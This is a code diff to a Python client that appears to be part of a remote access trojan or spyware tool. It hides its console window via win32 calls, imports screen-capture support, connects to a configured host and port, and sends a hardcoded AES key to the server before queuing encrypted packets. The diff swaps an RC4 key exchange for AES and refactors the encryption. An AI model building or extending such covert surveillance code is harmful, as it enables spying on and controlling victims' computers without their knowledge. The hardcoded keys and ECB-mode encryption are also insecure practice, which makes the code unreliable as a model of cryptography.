@@ -8,7 +8,6 @@ import base64
 from PIL import ImageGrab
 from packet import Packet
 from encryption import encrypt,decrypt
-from Crypto.Cipher import AES
 
 def hide():
     import win32console,win32gui
@@ -30,7 +29,7 @@ class Client:
 
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((TCP_IP, TCP_PORT))
-        self.sendRC4Key()
+        self.sendAESKey()
 
     def run(self):
 
@@ -113,14 +112,8 @@ class Client:
 
         self.enqueue(pkt)
 
-    def encryptData(self,pkt):
-        key = '\x40\x73\x8a\xc7\x8f\x0f\xd5\xef\x02\x57\xb2\xe1\x9b\x83\x04\x15'
-        cipher = AES.new(key,AES.MODE_ECB)
-        pkt.padData()
-        pkt.data = cipher.encrypt(pkt.data)
-
-    def sendRC4Key(self):
-        key = '\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x00'
+    def sendAESKey(self):
+        key = '\x40\x73\x8A\xC7\x8F\x0F\xD5\xEF\x02\x57\xB2\xE1\x9B\x83\x04\x15'
         pkt = Packet()
         pkt.state = '100'
         pkt.toIP = ''
@@ -130,7 +123,7 @@ class Client:
         self.messageQ.put(pkt)
 
     def enqueue(self,pkt):
-        self.encryptData(pkt)
+        pkt.encryptData()
         self.messageQ.put(pkt)
 
     def dequeue(self):
